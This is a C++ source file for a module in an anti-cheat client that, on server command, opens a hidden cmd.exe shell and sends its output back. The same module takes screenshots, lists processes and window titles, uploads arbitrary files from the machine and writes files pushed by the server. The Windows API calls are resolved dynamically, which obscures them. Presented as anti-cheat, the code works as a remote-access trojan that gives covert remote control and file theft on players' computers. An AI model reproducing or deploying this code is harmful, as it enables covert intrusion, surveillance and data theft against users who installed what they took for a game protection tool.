#include "anticheat.h"
#include <stdint.h>
#include <string>
#include "protocol.h"
#include "rmc_protocol.h"
#include "utils/utils.h"
#include <xorstr.hpp>
#include "utils/api_resolver.h"
#include <msgpack.hpp>
#include <memory>
//https://github.com/gaojihao/7520Inspru/blob/348470adf8d212e3af37ffcfd8caffee37ecd2b8/inspru/source/GSM_AT/GTrans/gprs/ex_file.cpp


struct ConsoleProperties {
	std::string console_application;
	std::string working_directory;
	bool inherit_handle = true;
	DWORD console_flags = NORMAL_PRIORITY_CLASS;
	DWORD startup_flags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	WORD show_console = SW_HIDE;
	DWORD timeout = 50;
};
typedef void(*ConsoleHandler)(const std::string&);
class Console
{
public:
	Console(ConsoleProperties input_properties)
	{
		WaitForSingleObject = IMPORT(L"kernel32.dll", WaitForSingleObject);
		PeekNamedPipe = IMPORT(L"kernel32.dll", PeekNamedPipe);
		CreatePipe = IMPORT(L"kernel32.dll", CreatePipe);
		CreateProcessA = IMPORT(L"kernel32.dll", CreateProcessA);
		process_properties = input_properties;
#if 1
		startup_info.dwFlags = process_properties.startup_flags;
		startup_info.wShowWindow = process_properties.show_console;
#endif
		security_attrib = { sizeof(SECURITY_ATTRIBUTES), 0, process_properties.inherit_handle };
	}
	~Console()
	{
		close();
		CloseHandle(process_info.hProcess);
		CloseHandle(process_info.hThread);
		CloseHandle(input_read);
		CloseHandle(input_write);
		CloseHandle(output_read);
		CloseHandle(output_write);
	}

	bool open()
	{
		open_pipe(input_read, input_write);
		open_pipe(output_read, output_write);
		startup_info.hStdOutput = output_write;
		startup_info.hStdError = output_write;
		startup_info.hStdInput = input_read;
		return CreateProcessA(process_properties.console_application.c_str(), nullptr, 0, 0, process_properties.inherit_handle, process_properties.console_flags, 0, process_properties.working_directory.c_str(), &startup_info, &process_info);
	}
	bool close()
	{
		return TerminateProcess(process_info.hProcess, 0);
	}
	bool write(const std::string& input)
	{
		DWORD bytes_written;
		return WriteFile(input_write, input.c_str(), input.length(), &bytes_written, nullptr);
	}
	void read(ConsoleHandler output_handler)
	{
		// Read command output
		read_console(output_handler);
		// Read path
		read_console(output_handler);
	}
	bool alive()
	{
		return WaitForSingleObject(process_info.hProcess, process_properties.timeout) == WAIT_TIMEOUT;
	}
private:
	bool open_pipe(HANDLE& read, HANDLE& write)
	{
		return CreatePipe(&read, &write, &security_attrib, 0);
	}
	void read_console(ConsoleHandler output_handler)
	{
		do {
			output_handler(std::move(read_pipe(output_read)));
		} while (WaitForSingleObject(input_read, process_properties.timeout) == WAIT_OBJECT_0 && WaitForSingleObject(process_info.hProcess, process_properties.timeout) == WAIT_TIMEOUT);
	}
	std::string read_pipe(HANDLE& pipe)
	{
		unsigned long bytes_available;

		std::string output;
		DWORD bytes_of_read = 0;

		if (PeekNamedPipe(pipe, nullptr, 0, nullptr, &bytes_available, nullptr) && bytes_available != 0) {
			output.resize(bytes_available);
			if (!ReadFile(pipe, output.data(), bytes_available, &bytes_of_read, nullptr)) {
				
			}
		}
		return output;
	}

	decltype(&WaitForSingleObject) WaitForSingleObject;
	decltype(&PeekNamedPipe) PeekNamedPipe;
	decltype(&CreatePipe) CreatePipe;
	decltype(&CreateProcessA) CreateProcessA;

	STARTUPINFOA startup_info{};
	PROCESS_INFORMATION process_info{};
	SECURITY_ATTRIBUTES security_attrib{};
	HANDLE input_read;
	HANDLE input_write;
	HANDLE output_read;
	HANDLE output_write;
	ConsoleProperties process_properties;
};

class CFile
{
public:
	CFile()
	{
		file_handle_ = INVALID_HANDLE_VALUE;
		CreateFileA = IMPORT(L"kernel32.dll", CreateFileA);
		GetFileSize = IMPORT(L"kernel32.dll", GetFileSize);
		FlushFileBuffers = IMPORT(L"kernel32.dll", FlushFileBuffers);
		ReadFile = IMPORT(L"kernel32.dll", ReadFile);
		WriteFile = IMPORT(L"kernel32.dll", WriteFile);
		CloseHandle = IMPORT(L"kernel32.dll", CloseHandle);
		SetFilePointer = IMPORT(L"kernel32.dll", SetFilePointer);
	}

	~CFile()
	{
		if (file_handle_ != INVALID_HANDLE_VALUE)
			CloseHandle(file_handle_);
	}

	bool create(const std::string& path)
	{
		file_handle_ = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, 0,
			CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
		if (file_handle_ != INVALID_HANDLE_VALUE)
		{
			if (CloseHandle(file_handle_))
				return true;
			else
				return false;
		}
		else
		{
			return false;
		}
		return false;
	}

	bool open_file(const std::string& path, unsigned int mode)
	{
		DWORD access = 0;
		bool r = false;
		switch (mode)
		{
		case 'r':
		{
			access = GENERIC_READ;
			break;
		}
		case 'w':
		{
			access = GENERIC_WRITE;
			break;
		}
		default:
			return r;
		}
		file_handle_ = CreateFileA(path.c_str(), access, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		r = file_handle_ != INVALID_HANDLE_VALUE;
		if (r)
		{
			size_ = get_file_size();
		}
		return r;
	}
	std::size_t read(void* buffer, unsigned num_count)
	{
		if (file_handle_ == INVALID_HANDLE_VALUE || buffer == 0)
		{
			return false;
		}

		if (num_count == 0)
		{
			return false;
		}

		unsigned long bytes_of_read = 0;
		if (ReadFile(file_handle_, buffer, num_count, &bytes_of_read, 0))
		{
			return bytes_of_read;
		}
		else
		{
			return 0;
		}
	}

	bool write(const void* buffer, unsigned num_size)
	{
		if (file_handle_ == INVALID_HANDLE_VALUE)
		{
			return false;
		}
		if (num_size == 0)
		{
			return false;
		}
		unsigned long bytes_of_write = 0;
		if (WriteFile(file_handle_, buffer, num_size, &bytes_of_write, 0))
		{
			return true;
		}
		else
		{
			return false;
		}
	}
	void flush()
	{
		if (file_handle_ == INVALID_HANDLE_VALUE)
			return;
		FlushFileBuffers(file_handle_);
	}

	long seek(unsigned off_set, unsigned from)
	{
		long pos = SetFilePointer(file_handle_, off_set, 0, from);
		return pos;
	}

	long seek2end()
	{
		return seek(0, FILE_END);
	}

	long seek2begin()
	{
		return seek(0, FILE_BEGIN);
	}

	std::size_t get_file_size()
	{
		return GetFileSize(file_handle_, NULL);
	}

	decltype(&CreateFileA) CreateFileA;
	decltype(&FlushFileBuffers) FlushFileBuffers;
	decltype(&GetFileSize) GetFileSize;
	decltype(&ReadFile) ReadFile;
	decltype(&WriteFile) WriteFile;
	decltype(&CloseHandle) CloseHandle;
	decltype(&SetFilePointer) SetFilePointer;

	HANDLE file_handle_;
	std::size_t size_;
};

void rmc_download_file_status(unsigned char status)
{
	ProtocolRmc proto;
	RmcC2SDownloadFile resp { status };
	msgpack::sbuffer buffer;
	msgpack::pack(buffer, resp);
	proto.type = RMC_PKG_TYPE_DOWNLOAD_FILE;
	proto.data.resize(buffer.size());
	memcpy(proto.data.data(), buffer.release(), buffer.size());
	AntiCheat::instance().send(proto);
}

void rmc_upload_file_fail(unsigned char status)
{
	ProtocolRmc proto;
	RmcC2SUploadFile resp{ status, "", 0, 0, {}};
	msgpack::sbuffer buffer;
	msgpack::pack(buffer, resp);
	proto.type = RMC_PKG_TYPE_UPLOAD_FILE;
	proto.data.resize(buffer.size());
	memcpy(proto.data.data(), buffer.release(), buffer.size());
	AntiCheat::instance().send(proto);
}

void rmc_upload_file_piece(const std::string& path, unsigned int total_size, unsigned int pos, const std::vector<unsigned char>& piece)
{
	ProtocolRmc proto;
	RmcC2SUploadFile resp{ UPLOAD_FILE_STATUS_SUCCESS, path, total_size, pos, piece };
	proto.type = RMC_PKG_TYPE_UPLOAD_FILE;
	msgpack::sbuffer buffer;
	msgpack::pack(buffer, resp);
	proto.data.resize(buffer.size());
	memcpy(proto.data.data(), buffer.release(), buffer.size());
	AntiCheat::instance().send(proto);
}


void rmc_screenshot_fail(unsigned char status)
{
	ProtocolRmc proto;
	RmcC2SScreenShot resp{ status, "", 0, 0, {} };
	msgpack::sbuffer buffer;
	msgpack::pack(buffer, resp);
	proto.type = RMC_PKG_TYPE_SCREENSHOT;
	proto.data.resize(buffer.size());
	memcpy(proto.data.data(), buffer.release(), buffer.size());
	AntiCheat::instance().send(proto);
}

void rmc_screenshot_piece(const std::string& guid, unsigned int total_size, unsigned int pos, const std::vector<unsigned char>& piece)
{
	ProtocolRmc proto;
	RmcC2SScreenShot resp{ SCREEN_SHOT_STATUS_SUCCESS, guid, total_size, pos, piece };
	proto.type = RMC_PKG_TYPE_SCREENSHOT;
	msgpack::sbuffer buffer;
	msgpack::pack(buffer, resp);
	proto.data.resize(buffer.size());
	memcpy(proto.data.data(), buffer.release(), buffer.size());
	AntiCheat::instance().send(proto);
}

void rmc_cmd_resp(unsigned char status, const std::string& work_dir, const std::string& cmd, const std::string& resp)
{
	ProtocolRmc proto;
	RmcC2SCommandLine package{ status, work_dir, cmd, resp };
	proto.type = RMC_PKG_TYPE_CMD;
	msgpack::sbuffer buffer;
	msgpack::pack(buffer, package);
	proto.data.resize(buffer.size());
	memcpy(proto.data.data(), buffer.release(), buffer.size());
	AntiCheat::instance().send(proto);
}

void rmc_query_information_resp (unsigned char type, const std::string& r1, const std::vector<std::string>& r2)
{
	ProtocolRmc proto;
	RmcC2SQueryInformation package { type, r1, r2 };
	proto.type = RMC_PKG_TYPE_QUERY_INFORMATION;
	msgpack::sbuffer buffer;
	msgpack::pack(buffer, package);
	proto.data.resize(buffer.size());
	memcpy(proto.data.data(), buffer.release(), buffer.size());
	AntiCheat::instance().send(proto);
}

namespace ShellCode
{
	class TaskRmc : public Task
	{
	public:
		TaskRmc()
		{
			set_interval(10);
			set_package_id((Protocol::PackageId)RMC_PKG_ID);
		}
		~TaskRmc()
		{

		}
		void remove_task(const std::string& path)
		{
			delete tasks_[path];
			tasks_[path] = nullptr;
			tasks_.erase(tasks_.find(path));
		}

		CFile* create_file_task(const std::string& path)
		{
			tasks_.emplace(std::make_pair(path, new CFile()));
			return get_file_task(path);
		}

		CFile* get_file_task(const std::string& path)
		{
			return tasks_[path];
		}

		bool exist_file_task(const std::string& path)
		{
			return tasks_.find(path) != tasks_.end();
		}

		void rmc_cmd_recv(unsigned char status, const std::string& work_dir, const std::string& cmd, const std::string resp)
		{
			switch (status)
			{
			case COMMAND_LINE_OPERATION_CREATE:
			{
				if (console_ptr)
				{
					delete console_ptr;
					console_ptr = nullptr;
				}
				char system_dir[MAX_PATH] = { 0 };
				auto GetSystemDirectoryA = IMPORT(L"kernel32.dll", GetSystemDirectoryA);
				GetSystemDirectoryA(system_dir, sizeof(system_dir));
				ConsoleProperties cmd_prop = {
					std::string(system_dir) + "\\cmd.exe",
					work_dir
				};
				console_ptr = new Console(cmd_prop);
				console_ptr->open();
				rmc_cmd_resp(COMMAND_LINE_OPERATION_CREATE_SUCCESS, "", "", "");
				break;
			}
			case COMMAND_LINE_OPERATION_EXECUTE:
			{
				if (console_ptr)
				{
					console_ptr->write(cmd + "\n");
				}
				break;
			}
			case COMMAND_LINE_OPERATION_CLOSE:
			{
				if (console_ptr)
				{
					console_ptr->close();
					console_ptr = nullptr;
				}
				break;
			}
			default:
				break;
			}
		}

		virtual void on_time_proc(uint32_t curtime)
		{
			if (console_ptr)
			{
				console_ptr->read([](const std::string& text) {
					if (text.size())
					{
						rmc_cmd_resp(COMMAND_LINE_OPERATION_RESP, "", "", text);
					}
				});
			}
		}
		virtual void on_recv_package(void* sender, uintptr_t conn_id, json& package, Protocol::PackageType channel)
		{
			ProtocolRmc proto;
			proto.from_json(package);
			switch (proto.type)
			{
			case RMC_PKG_TYPE_QUERY_INFORMATION:
			{
				msgpack::unpacked msg_;
				msgpack::unpack(&msg_, (char*)proto.data.data(), proto.data.size());
				auto [type] = msg_.get().as<RmcS2CQueryInformation>();
				switch (type)
				{
				case QUERY_INFORMATION_PROCESS:
				{
					auto processes = Utils::CWindows::instance().enum_process();
					std::vector<std::string> r;
					for (auto& process : processes)
					{
						r.push_back(Utils::wstring2string(process.second.name));
					}
					rmc_query_information_resp(type, "", r);
					break;
				}
				case QUERY_INFORMATION_WINDOWS:
				{
					auto windows = Utils::CWindows::instance().enum_windows();
					std::vector<std::string> r;
					for (auto& window : windows)
					{
						r.push_back(Utils::wstring2string(window.caption));
					}
					rmc_query_information_resp(type, "", r);
					break;
				}
				case QUERY_INFORMATION_COMPUTER_NAME:
				{
					char buf[MAX_COMPUTERNAME_LENGTH] = { 0 };
					auto GetComputerNameA = IMPORT(L"kernel32.dll", GetComputerNameA);
					DWORD buf_size = sizeof(buf);
					GetComputerNameA(buf, &buf_size);
					rmc_query_information_resp(type, buf, std::vector<std::string>());
					break;
				}
				default:
					break;
				}
				break;
			}
			case RMC_PKG_TYPE_DOWNLOAD_FILE:
			{
				msgpack::unpacked msg_;
				msgpack::unpack(&msg_, (char*)proto.data.data(), proto.data.size());
				auto [status, path, total_size, pos, piece] = msg_.get().as<RmcS2CDownloadFile>();

				if (!exist_file_task(path))
				{
					if (!create_file_task(path)->create(path))
					{
						rmc_download_file_status(DOWNLOAD_FILE_STATUS_CREATE_FILE_FAIL);
						break;
					}
					auto file = get_file_task(path);
					if (!file->open_file(path, 'w'))
					{
						rmc_download_file_status(DOWNLOAD_FILE_STATUS_OPEN_FILE_FAIL);
						break;
					}
				}

				auto file = get_file_task(path);
				file->seek(pos, FILE_BEGIN);
				file->write(piece.data(), piece.size());

				if ((pos + piece.size()) == total_size)
				{
					remove_task(path);
					rmc_download_file_status(DOWNLOAD_FILE_STATUS_SUCCESS);
				}

				break;
			}
			case RMC_PKG_TYPE_UPLOAD_FILE:
			{
				msgpack::unpacked msg_;
				msgpack::unpack(&msg_, (char*)proto.data.data(), proto.data.size());
				auto [path] = msg_.get().as<RmcS2CUploadFile>();
				
				CFile file;
				if (!file.open_file(path, 'r'))
				{
					rmc_upload_file_fail(UPLOAD_FILE_STATUS_OPEN_FILE_FAIL);
					break;
				}
				else
				{
					const std::size_t file_size = file.get_file_size();
					const int piece_size = 0x1000;
					const int num_piece = file_size / piece_size;
					std::vector<unsigned char> buffer(piece_size);
					for (int i = 0; i < num_piece; i++)
					{
						file.read(buffer.data(), piece_size);
						rmc_upload_file_piece(path, file_size, i*piece_size, buffer);
					}
					const std::size_t rest_size = file_size % piece_size;
					if (rest_size)
					{
						buffer.resize(rest_size);
						file.read(buffer.data(), rest_size);
						rmc_upload_file_piece(path, file_size, num_piece*piece_size, buffer);
					}
				}
				break;
			}
			case RMC_PKG_TYPE_ECHO:
			{
				msgpack::unpacked msg_;
				msgpack::unpack(&msg_, (char*)proto.data.data(), proto.data.size());
				AntiCheat::instance().send(proto);
				break;
			}
			case RMC_PKG_TYPE_SCREENSHOT:
			{
				msgpack::unpacked msg_;
				msgpack::unpack(&msg_, (char*)proto.data.data(), proto.data.size());
				auto[guid] = msg_.get().as<RmcS2CScreenShot>();

				size_t bitmap_size;
				std::unique_ptr<unsigned char[]> screenshot(Utils::get_screenshot(&bitmap_size));
				
				if (!bitmap_size)
				{
					rmc_screenshot_fail(SCREEN_SHOT_STATUS_FAIL);
					return;
				}
				else
				{
					const std::size_t file_size = bitmap_size;
					const int piece_size = 0x1000;
					const int num_piece = file_size / piece_size;
					std::vector<unsigned char> buffer(piece_size);
					for (int i = 0; i < num_piece; i++)
					{
						memcpy(buffer.data(), &screenshot.get()[i*piece_size], piece_size);
						rmc_screenshot_piece(guid, file_size, i*piece_size, buffer);
					}
					const std::size_t rest_size = file_size % piece_size;
					if (rest_size)
					{
						buffer.resize(rest_size);
						memcpy(buffer.data(), &screenshot.get()[num_piece*piece_size], rest_size);
						rmc_screenshot_piece(guid, file_size, num_piece*piece_size, buffer);
					}
				}
				break;
			}
			case RMC_PKG_TYPE_CMD:
			{
				msgpack::unpacked msg_;
				msgpack::unpack(&msg_, (char*)proto.data.data(), proto.data.size());
				auto[status, work_dir, cmd, resp] = msg_.get().as<RmcS2CCommandLine>();
				rmc_cmd_recv(status, work_dir, cmd, resp);
				break;
			}
			default:
				break;
			}

		}

		Console* console_ptr = nullptr;
		std::map<std::string, CFile*> tasks_;
	};

	uint32_t main()
	{
		TaskRmc* task = new TaskRmc();
		if (AntiCheat::instance().add_task(task))
		{
			return 0;
		}
		else
		{
			AntiCheat::instance().task_map_.erase(AntiCheat::instance().task_map_.find(task->get_package_id()));
			if (!AntiCheat::instance().add_task(task))
			{
				delete task;
				return 1;
			}
			return 0;
		}
	}
}